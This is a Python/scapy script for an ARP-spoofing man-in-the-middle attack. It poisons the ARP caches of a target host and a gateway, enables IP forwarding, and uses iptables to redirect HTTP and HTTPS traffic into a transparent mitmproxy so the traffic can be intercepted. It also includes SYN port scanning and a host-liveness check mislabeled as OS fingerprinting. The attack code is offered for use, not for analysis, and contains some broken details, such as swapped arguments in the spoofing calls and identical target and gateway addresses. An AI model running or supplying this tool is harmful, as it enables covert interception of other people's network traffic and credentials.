from scapy.all import ARP, Ether, IP, sendp, sniff, conf, srp, TCP, sr1, DNS, DNSQR
import time
import sys
import threading
import os
import subprocess
import datetime
import requests

conf.verb = 0

interface = "eth0"
gateway_ip = "192.168.127.12"
target_ip = "192.168.127.12"
attacker_mac = "00:11:22:33:44:55"
mitmproxy_port = 8080

def log_to_file(message):
    with open("traffic_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {message}\n")


def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=target_mac)
    packet = ether / arp
    sendp(packet, iface=interface)
    msg = f"Spoofing: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst=target_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=spoof_mac)
    packet = ether / arp
    sendp(packet,count=4, iface=interface)
    msg = f"Restoring: {target_ip} <- {spoof_ip}"
    print(msg)
    log_to_file(msg)

def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    result = srp(arp_request, timeout=2, iface=interface)[0]
    return result[0][1].hwsrc if result else None

def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_mac, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing error: {e}"
        print(msg)
        log_to_file(msg)

def start_mitmproxy():
    msg = f"mitmproxy {mitmproxy_port} started"
    print(msg)
    log_to_file(msg)
    mitmproxy_process = subprocess.Popen(["mitmproxy", "--mode","transparent", "--listen_port", str(mitmproxy_port)])
    time.sleep(2)
    return mitmproxy_process

def setup_iptables():
    msg = f"iptables setup"
    print(msg)
    log_to_file(msg)
    os.system(f"sysctl -w net.ipv4.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port {mitmproxy_port}")

def cleanup():
    msg = f"cleanup"
    print(msg)
    log_to_file(msg)
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port {mitmproxy_port}")
    os.system(f"sysctl -w net.ipv4.ip_forward=0")

def os_fingerprint(target_ip):
    msg = f"OS fingerprinting {target_ip}"
    print(msg)
    log_to_file(msg)
    ip = IP(dst=target_ip)
    tcp = TCP(dport=80, flags="S")
    packet = ip / tcp
    response = sr1(packet, timeout=2, verbose=False)
    if response:
        if response.haslayer(TCP):
            if response[TCP].flags == 18:
                msg = f"OS fingerprinting successful: {target_ip} is online"
                print(msg)
                log_to_file(msg)
            else:
                msg = f"OS fingerprinting failed: {target_ip} is offline"
                print(msg)
                log_to_file(msg)
        else:
            msg = f"OS fingerprinting failed: {target_ip} is offline"
            print(msg)
            log_to_file(msg)
    else:
        msg = f"OS fingerprinting failed: {target_ip} is offline"
    print(msg)
    log_to_file(msg)


def scan_ports(target_ip, port_range=(1, 1000)):
    msg = f"scan ports {target_ip}"
    print(msg)
    log_to_file(msg)
    open_ports = []
    for port in range(port_range[0], port_range[1] + 1):
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(pkt, timeout=2, verbose=False)
        if response and response.haslayer(TCP):
            if response[TCP].flags == 18:
                open_ports.append(port)
                msg = f"Port {port} is open"
                print(msg)

                log_to_file(msg)
            else:
                msg = f"Port {port} is closed"
                print(msg)
                log_to_file(msg)
        else:
            msg = f"Port {port} is filtered"
            print(msg)
            log_to_file(msg)
    return open_ports
